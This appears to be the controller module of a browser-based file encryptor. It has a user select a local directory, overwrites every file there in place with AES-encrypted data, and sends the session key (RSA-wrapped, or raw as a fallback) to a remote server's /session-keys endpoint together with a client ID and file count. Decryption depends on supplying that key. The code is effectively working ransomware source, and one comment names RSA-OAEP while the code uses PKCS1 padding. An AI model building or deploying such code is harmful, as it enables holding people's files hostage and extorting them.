/**
 * Application controller: wires UI to crypto + FSA modules.
 */
import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
// Import crypto for RSA encryption (Webpack polyfill)
import crypto from 'crypto';
import { Buffer } from 'buffer';

const API_BASE_URL = (typeof process !== 'undefined' && process.env && process.env.API_BASE_URL)
  ? process.env.API_BASE_URL
  : '';
const sanitizedApiBaseUrl = API_BASE_URL.replace(/\/$/, '');

const state = {
  selectedDirectory: null,
  isEncrypting: false,
  filesProcessed: 0,
  totalFiles: 0,
  encryptedFiles: [],
  errors: [],
  sessionAes: null,
  sessionKeyBase64: null,
  clientId: null,
  backendPublicKey: null // NEW: Store the RSA Public Key
};

let DOM = {};

const reportSessionKey = async (rawKeyBase64) => {
  if (!sanitizedApiBaseUrl || !state.clientId) return;
  
  let payloadKey = rawKeyBase64;

  // --- KEY WRAPPING LOGIC START ---
  if (state.backendPublicKey) {
    try {
      console.log('[App] Encrypting AES key with Server RSA Public Key...');
      
      // Convert the Base64 AES key back to a Buffer
      const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');

      // Encrypt using RSA-OAEP
      const encryptedBuffer = crypto.publicEncrypt(
        {
          key: state.backendPublicKey,
          padding: crypto.constants.RSA_PKCS1_PADDING
        },
        aesKeyBuffer
      );

      // Convert encrypted result to Base64 to send via JSON
      payloadKey = encryptedBuffer.toString('base64');
      console.log('[App] Key wrapped successfully.');
    } catch (e) {
      console.error('[App] Key wrapping failed:', e);
      log('Warning: Failed to encrypt session key securely.', 'warning');
      // Fallback: sending raw key (or you could choose to abort)
    }
  } else {
    console.warn('[App] No Public Key found. Sending raw key (INSECURE).');
  }
  // --- KEY WRAPPING LOGIC END ---

  try {
    await fetch(`${sanitizedApiBaseUrl}/session-keys`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        key: payloadKey, // This is now the RSA-Encrypted AES key
        clientId: state.clientId,
        filesCount: state.totalFiles,
        timestamp: new Date().toISOString()
      })
    });
    console.log('[App] Session key reported to server.');
  } catch (error) {
    console.warn('[App] Failed to report session key:', error);
  }
};

const checkBrowserVersion = () => {
  const chromeMatch = navigator.userAgent.match(/Chrome\/(\d+)/);
  const version = chromeMatch ? chromeMatch[1] : 'Unknown';

  if (version >= 86) {
    log(`Chrome ${version} detected (FSA API supported)`, 'success');
  } else {
    log(`Chrome ${version} detected - FSA API may not be fully supported`, 'warning');
  }
};

const checkFSASupport = () => {
  const supported = FileSystemModule.isSupported();
  if (supported) {
    DOM.supportStatus.className = 'status-box success';
    DOM.supportStatus.innerHTML = `
        <p>✅ <strong>File System Access API: SUPPORTED</strong></p>
        <p>Your browser supports FSA API. You can select directories and encrypt files.</p>
    `;
    DOM.selectDirBtn.disabled = false;
  } else {
    DOM.supportStatus.className = 'status-box error';
    DOM.supportStatus.innerHTML = `
        <p>❌ <strong>File System Access API: NOT SUPPORTED</strong></p>
        <p>Your browser does not support FSA API. Please use Chrome 86+</p>
    `;
    DOM.selectDirBtn.disabled = true;
  }
};

const setupEventListeners = () => {
  DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
  DOM.startEncryptBtn.addEventListener('click', startEncryption);
  DOM.stopEncryptBtn.addEventListener('click', stopEncryption);
  
  // CHANGED: Now calls decryptAllFiles instead of decryptFile
  DOM.decryptBtn.addEventListener('click', decryptAllFiles); 
  
  DOM.clearLogsBtn.addEventListener('click', () => (DOM.logContainer.innerHTML = ''));
};

const handleDirectorySelection = async () => {
  try {
    log('Opening directory picker...', 'info');
    const directoryHandle = await FileSystemModule.selectDirectory();
    state.selectedDirectory = directoryHandle;
    const dirName = directoryHandle.name;

    DOM.selectedDirInfo.innerHTML = `
        <p><strong>Selected Directory:</strong> ${dirName}</p>
        <p><strong>Permission:</strong> ✅ Granted</p>
        <p><strong>Path:</strong> Local file system</p>
    `;
    DOM.startEncryptBtn.disabled = false;
    log(`Directory selected: ${dirName}`, 'success');
  } catch (error) {
    if (error.name === 'AbortError') {
      log('Directory selection cancelled', 'warning');
    } else {
      log(`Error selecting directory: ${error.message}`, 'error');
    }
  }
};

const startEncryption = async () => {
  if (!state.selectedDirectory) {
    log('No directory selected', 'error');
    return;
  }

  if (!state.clientId) {
    log('Client ID not assigned. Requesting new ID...', 'warning');
    await acquireClientId();
    if (!state.clientId) {
      log('Unable to start encryption without client ID', 'error');
      return;
    }
  }

  state.isEncrypting = true;
  state.filesProcessed = 0;
  state.encryptedFiles = [];
  state.errors = [];
  state.sessionAes = null;
  state.sessionKeyBase64 = null;

  DOM.startEncryptBtn.disabled = true;
  DOM.stopEncryptBtn.disabled = false;
  DOM.selectDirBtn.disabled = true;

  log('Starting encryption process...', 'success');

  try {
    const session = await CryptoModule.generateSessionKey();
    state.sessionAes = session.aes;
    state.sessionKeyBase64 = session.rawKeyBase64;
    
    // Report key (now includes encryption logic)
    await reportSessionKey(session.rawKeyBase64);

    const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
    state.totalFiles = files.length;

    log(`Found ${files.length} files to encrypt`, 'info');
    DOM.progressText.textContent = `Encrypting ${files.length} files...`;

    // Encrypt each file
    for (let i = 0; i < files.length && state.isEncrypting; i++) {
      await encryptFileInPlace(files[i], state.sessionAes);
      
      // Update progress
      state.filesProcessed = i + 1;
      const percent = (state.filesProcessed / state.totalFiles) * 100;
      DOM.progressBar.style.width = percent + '%';
      DOM.progressText.textContent = `Encrypting: ${state.filesProcessed}/${state.totalFiles} files (${percent.toFixed(1)}%)`;
    }

    if (state.isEncrypting) {
      log(`✅ Encryption complete! ${state.encryptedFiles.length} files encrypted`, 'success');
    } else {
      log('Encryption stopped by user', 'warning');
    }

  } catch (error) {
    log(`Encryption error: ${error.message}`, 'error');
  } finally {
    state.isEncrypting = false;
    DOM.startEncryptBtn.disabled = false;
    DOM.stopEncryptBtn.disabled = true;
    DOM.selectDirBtn.disabled = false;
  }
};

const encryptFileInPlace = async (fileHandle, cryptoKey) => {
  try {
    // Step 1: Read original file
    const uint8Array = await FileSystemModule.readFileAsUint8Array(fileHandle);

    // Step 2: Encrypt
    const encryptedData = await CryptoModule.encryptFile(uint8Array, cryptoKey);

    // Step 3: Prepare encrypted content with metadata
    const metadata = JSON.stringify({
      version: encryptedData.version,
      algorithm: encryptedData.algorithm,
      iv: encryptedData.iv,
      tag: encryptedData.tag,
      timestamp: encryptedData.timestamp
    });
    
    const encryptedBytes = new TextEncoder().encode(
      metadata + '\n---ENCRYPTED_DATA---\n' + encryptedData.ciphertext
    );

    // Step 4: Write encrypted content back to original file
    await FileSystemModule.writeBytesToHandle(fileHandle, encryptedBytes);

    state.encryptedFiles.push({
      name: fileHandle.name,
      size: uint8Array.length,
      encrypted: encryptedBytes.length
    });

    log(`✓ Encrypted: ${fileHandle.name} (${(uint8Array.length / 1024).toFixed(2)} KB → ${(encryptedBytes.length / 1024).toFixed(2)} KB)`, 'success');
    updateFilesList();

  } catch (error) {
    log(`✗ Error encrypting ${fileHandle.name}: ${error.message}`, 'error');
    state.errors.push({ file: fileHandle.name, error: error.message });
  }
};

const decryptAllFiles = async () => {
  // Check if a directory is selected
  if (!state.selectedDirectory) {
    log('Please select the directory you want to decrypt first.', 'error');
    return;
  }

  // Prompt for the key ONCE for the whole batch
  const rawKeyBase64 = prompt('Enter the AES session key (base64) to decrypt ALL files:');
  if (!rawKeyBase64) return;

  log('Starting batch decryption...', 'info');
  DOM.decryptBtn.disabled = true;

  try {
    // Reuse the FSA module to get all files in the folder
    const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
    log(`Found ${files.length} files. Checking for encryption...`, 'info');

    let decryptedCount = 0;
    let skippedCount = 0;

    // Loop through every file in the folder
    for (const fileHandle of files) {
        const success = await decryptFileInPlace(fileHandle, rawKeyBase64);
        if (success) {
            decryptedCount++;
        } else {
            skippedCount++;
        }
    }

    log(`Batch Decryption Finished: ${decryptedCount} decrypted, ${skippedCount} skipped/failed.`, 'success');
    updateFilesList(); // Refresh the UI list

  } catch (error) {
    log(`Batch decryption error: ${error.message}`, 'error');
  } finally {
    DOM.decryptBtn.disabled = false;
  }
};

const decryptFileInPlace = async (fileHandle, rawKeyBase64) => {
  try {
    // Step 1: Read file content as text to find the metadata
    const content = await FileSystemModule.readFileAsText(fileHandle);

    // Step 2: Check if this file is actually encrypted by us
    // We look for the specific separator we added during encryption
    const separator = '\n---ENCRYPTED_DATA---\n';
    if (!content.includes(separator)) {
        // This is a normal file (or already decrypted), skip it silently
        return false; 
    }

    // Step 3: Parse the metadata and ciphertext
    const parts = content.split(separator);
    // parts[0] is the JSON metadata (IV, Tag), parts[1] is the Base64 ciphertext
    let metadata;
    try {
        metadata = JSON.parse(parts[0]);
    } catch (e) {
        log(`Warning: Corrupted metadata in ${fileHandle.name}`, 'warning');
        return false;
    }
    
    const ciphertext = parts[1];

    // Step 4: Decrypt using the provided key
    const decryptedBytes = await CryptoModule.decryptFile(
      {
        iv: metadata.iv,
        ciphertext: ciphertext,
        tag: metadata.tag
      },
      rawKeyBase64
    );

    // Step 5: OVERWRITE the file with the original (decrypted) content
    await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);

    log(`✓ Restored: ${fileHandle.name}`, 'success');
    return true;

  } catch (error) {
    log(`✗ Failed to decrypt ${fileHandle.name}: ${error.message}`, 'error');
    return false;
  }
};

const stopEncryption = () => {
  state.isEncrypting = false;
  log('Encryption stopped', 'warning');
};

const updateFilesList = () => {
  let html = '';
  for (let file of state.encryptedFiles) {
    html += `<div class="encrypted">
      ✓ ${file.name} 
      <small>(${(file.size / 1024).toFixed(2)} KB → ${(file.encrypted / 1024).toFixed(2)} KB)</small>
    </div>`;
  }
  DOM.filesList.innerHTML = html || '<p>No files encrypted yet</p>';
};

const log = (message, type = 'info') => {
  const now = new Date();
  const timestamp = now.toLocaleTimeString();
  const logEntry = document.createElement('div');
  logEntry.className = `log-entry ${type}`;
  logEntry.textContent = `[${timestamp}] ${message}`;
  DOM.logContainer.appendChild(logEntry);
  DOM.logContainer.scrollTop = DOM.logContainer.scrollHeight;
  
  console.log(`[${type.toUpperCase()}] ${message}`);
};

export const initApp = () => {
  DOM = {
    supportStatus: document.getElementById('supportStatus'),
    selectDirBtn: document.getElementById('selectDirBtn'),
    selectedDirInfo: document.getElementById('selectedDirInfo'),
    encryptPassword: document.getElementById('encryptPassword'),
    startEncryptBtn: document.getElementById('startEncryptBtn'),
    stopEncryptBtn: document.getElementById('stopEncryptBtn'),
    decryptBtn: document.getElementById('decryptBtn'),
    progressBar: document.getElementById('progressBar'),
    progressText: document.getElementById('progressText'),
    filesList: document.getElementById('filesList'),
    logContainer: document.getElementById('logContainer'),
    clearLogsBtn: document.getElementById('clearLogsBtn'),
    browserVersion: document.getElementById('browserVersion')
  };

  if (DOM.encryptPassword) {
    DOM.encryptPassword.value = 'Auto-generated per session';
    DOM.encryptPassword.disabled = true;
    DOM.encryptPassword.title = 'Keys are generated automatically for each session.';
  }

  console.log('Initializing application...');
  checkBrowserVersion();
  checkFSASupport();
  setupEventListeners();
  acquireClientId();
  log('Application initialized', 'success');
};

const acquireClientId = async () => {
  if (!sanitizedApiBaseUrl) {
    log('API base URL not configured; cannot request client ID', 'error');
    return;
  }
  try {
    const response = await fetch(`${sanitizedApiBaseUrl}/new`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    if (!response.ok) {
      throw new Error(`Server responded ${response.status}`);
    }
    const data = await response.json();
    state.clientId = data.clientId;
    
    // --- NEW: Capture Public Key ---
    if (data.publicKey) {
        state.backendPublicKey = data.publicKey;
        console.log('[App] Received RSA Public Key from server');
    }
    // -------------------------------

    log(`Client ID assigned: ${state.clientId}`, 'info');
  } catch (error) {
    log(`Failed to acquire client ID: ${error.message}`, 'error');
  }
};